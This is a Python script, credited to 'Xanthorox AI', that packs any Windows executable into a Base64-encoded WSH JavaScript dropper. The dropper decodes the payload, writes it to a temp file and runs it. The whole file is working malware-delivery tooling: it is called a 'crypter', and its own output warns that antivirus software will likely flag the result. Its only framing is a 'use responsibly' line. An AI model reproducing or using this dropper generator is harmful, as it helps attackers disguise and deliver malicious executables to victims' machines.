import base64
import argparse
import os
import uuid

# Whole Script is made by Xanthorox @xanthorox 
# JavaScript template using WSH (Windows Script Host)
# It decodes Base64, writes to a temp file, executes, and tries to clean up.
JS_TEMPLATE = """
// Disable error popups, show them in console if using cscript
// On Error Resume Next; 

var b64Data = "{base64_data}";

// WSH Objects
var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");
var stream = null; // Initialize stream variable

// --- Base64 Decoding Function ---
// Source: Adapted from various online examples for WSH Base64 decoding
// Uses MSXML2.DOMDocument which is generally available on Windows
function decodeBase64(b64) {{
    var dm = null, el = null;
    try {{
        dm = new ActiveXObject('MSXML2.DOMDocument');
        el = dm.createElement('b64');
        el.dataType = 'bin.base64';
        el.text = b64;
        return el.nodeTypedValue; // Returns byte array (VT_ARRAY | VT_UI1)
    }} catch(e) {{
        WScript.Echo("Error initializing MSXML2.DOMDocument or decoding Base64: " + e.message);
        return null;
    }} finally {{
        if (el) {{ /* No explicit cleanup needed for element */ }}
        if (dm) {{ /* No explicit cleanup needed for DOMDocument */ }}
    }}
}}

// --- Main Execution Logic ---
var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
var tempFileName = "{temp_filename}"; // Unique name generated by Python
var tempFilePath = fso.BuildPath(tempDir, tempFileName);
var decodedBytes = null;

// WScript.Echo("Attempting to decode Base64 data...");
decodedBytes = decodeBase64(b64Data);

if (decodedBytes !== null) {{
    // WScript.Echo("Decoding successful. Writing to temporary file: " + tempFilePath);
    try {{
        // Use ADODB.Stream for writing binary data
        stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1; // adTypeBinary
        stream.Open();
        stream.Write(decodedBytes);
        stream.SaveToFile(tempFilePath, 2); // 2 = adSaveCreateOverWrite
        // WScript.Echo("Successfully wrote temporary file.");
    }} catch (e) {{
        WScript.Echo("Error writing temporary file '" + tempFilePath + "': " + e.message);
        tempFilePath = null; // Prevent execution attempt if write failed
    }} finally {{
        if (stream) {{
            try {{ stream.Close(); }} catch (ignore) {{}}
        }}
    }}

    if (tempFilePath && fso.FileExists(tempFilePath)) {{
        // WScript.Echo("Executing temporary file: " + tempFilePath);
        try {{
            // Execute the file.
            // Use quotes for paths with spaces.
            // Arguments: Path, WindowStyle (1=Normal), WaitOnReturn (false=Async)
            shell.Run('"' + tempFilePath + '"', 1, false); 
            // WScript.Echo("Execution command issued.");

            // --- Optional Cleanup ---
            // Cleanup is tricky because the JS script might exit before the EXE.
            // A common technique is to leave the file in TEMP, or launch
            // a secondary script to wait and delete. For simplicity,
            // we'll attempt a simple delete after a short delay,
            // but it's not guaranteed.
            // WScript.Sleep(5000); // Wait 5 seconds (adjust if needed)
            // if (fso.FileExists(tempFilePath)) {{
            //     // WScript.Echo("Attempting cleanup of temporary file...");
            //     try {{ fso.DeleteFile(tempFilePath); }} catch(e) {{ /* Ignore cleanup errors */ }}
            // }}
            
        }} catch (e) {{
            WScript.Echo("Error executing file '" + tempFilePath + "': " + e.message);
            // Attempt cleanup even if execution failed
            if (fso.FileExists(tempFilePath)) {{
                 try {{ fso.DeleteFile(tempFilePath); }} catch (ignore) {{}} 
            }}
        }}
    }} else if (tempFilePath) {{
         WScript.Echo("Temporary file does not exist, cannot execute.");
    }}

}} else {{
    WScript.Echo("Failed to decode Base64 data. Cannot proceed.");
}}

// Optional: Keep script host running for a bit to see console output if using cscript
// WScript.Sleep(3000); 
"""

def create_js_runner(exe_path, js_path):
    """
    Reads an EXE, encodes it to Base64, and embeds it into a JS WSH script.
    """
    if not os.path.exists(exe_path):
        print(f"Error: Input EXE file not found: {exe_path}")
        return
    if not exe_path.lower().endswith(".exe"):
        print(f"Warning: Input file '{exe_path}' does not have a .exe extension.")

    print(f"Reading EXE file: {exe_path}")
    try:
        with open(exe_path, "rb") as f:
            exe_content = f.read()
    except Exception as e:
        print(f"Error reading EXE file: {e}")
        return

    print("Encoding EXE content to Base64...")
    try:
        # Encode bytes to Base64 bytes, then decode to UTF-8 string for JS
        base64_encoded_data = base64.b64encode(exe_content).decode('utf-8')
    except Exception as e:
        print(f"Error encoding to Base64: {e}")
        return

    # Generate a relatively unique temporary filename for the JS script to use
    temp_filename = f"tmp_{uuid.uuid4()}.exe"

    print(f"Generating JavaScript code (temporary file will be named: {temp_filename})...")
    js_code = JS_TEMPLATE.format(
        base64_data=base64_encoded_data,
        temp_filename=temp_filename
    )

    print(f"Writing JavaScript to: {js_path}")
    try:
        with open(js_path, "w", encoding="utf-8") as f:
            f.write(js_code)
        print("JavaScript file created successfully.")
        print("\n--- WARNING ---")
        print("Antivirus software will likely detect this .js file as suspicious or malicious.")
        print(f"save it as '{temp_filename}' in the %TEMP% directory, and execute it.")
        print("Simple Crypter & Converter made by Xanthorox AI @xanthorox")
        print("---------------\n")

    except Exception as e:
        print(f"Error writing JavaScript file: {e}")
        return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Embed an EXE file into a JavaScript runner using Base64 encoding.",
        epilog="WARNING: The generated .js file is likely to be flagged by antivirus software. Use responsibly."
    )
    parser.add_argument("exe_file", help="Path to the input .exe file.")
    parser.add_argument("js_file", help="Path for the output .js file.")

    args = parser.parse_args()

    create_js_runner(args.exe_file, args.js_file)
